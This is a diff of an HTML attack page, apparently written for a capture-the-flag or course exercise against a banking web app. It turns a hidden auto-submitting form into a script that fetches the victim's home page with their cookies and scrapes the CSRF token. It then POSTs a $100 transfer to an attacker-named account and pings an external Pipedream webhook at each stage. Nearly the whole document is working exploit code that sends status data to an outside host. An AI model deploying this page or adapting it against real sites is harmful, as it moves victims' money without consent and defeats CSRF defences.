@@ -1,25 +1,44 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>Phish Me</title>
-</head>
+<head><meta charset="utf-8"><title>Auto-Transfer</title></head>
 <body>
-  <!-- notify your webhook that the bot loaded this page -->
-  <script>
-    new Image().src = "https://eok9itjcz7vwbnr.m.pipedream.net/?hit=phish";
-  </script>
+<script>
+/* 1  Notify Pipedream the bot loaded the page */
+(new Image()).src = "https://eok9itjcz7vwbnr.m.pipedream.net/?stage=loaded";
 
-  <!-- auto-submit the transfer as z5640334 -->
-  <form id="transfer" method="POST" action="/api/transfer">
-    <input type="hidden" name="csrf_token" value="MTU1OQ==">
-    <input type="hidden" name="username"   value="z5640334">
-    <input type="hidden" name="amount"     value="100">
-  </form>
+/* 2  Grab the home page (cookies are sent because credentials:"include") */
+fetch("/", {credentials:"include"})
+  .then(r => r.text())
+  .then(html => {
+      /* 3  Extract the current CSRF token */
+      const m = html.match(/name="csrf_token"\s+value="([^"]+)"/);
+      if (!m) throw "Token not found";
+      const token = m[1];
 
-  <script>
-    // wait a moment for the webhook ping, then drain the $100
-    setTimeout(() => document.getElementById('transfer').submit(), 50);
-  </script>
+      /* 4  Build x-www-form-urlencoded body */
+      const body = new URLSearchParams({
+        csrf_token: token,
+        username:   "ATTACKER_USER",   // <- change this
+        amount:     "100"
+      });
+
+      /* 5  Send the transfer */
+      return fetch("/api/transfer", {
+        method: "POST",
+        credentials: "include",
+        headers: {"content-type":"application/x-www-form-urlencoded"},
+        body
+      });
+  })
+  .then(() => {
+      /* 6  Ping again so you know the POST was made */
+      (new Image()).src ="https://eok9itjcz7vwbnr.m.pipedream.net/?stage=transfer";
+  })
+  .catch(err => {
+      (new Image()).src ="https://eok9itjcz7vwbnr.m.pipedream.net/?stage=error&msg="+encodeURIComponent(err);
+  });
+</script>
+<h1>Moving funds… 🤑</h1>
 </body>
 </html>
+
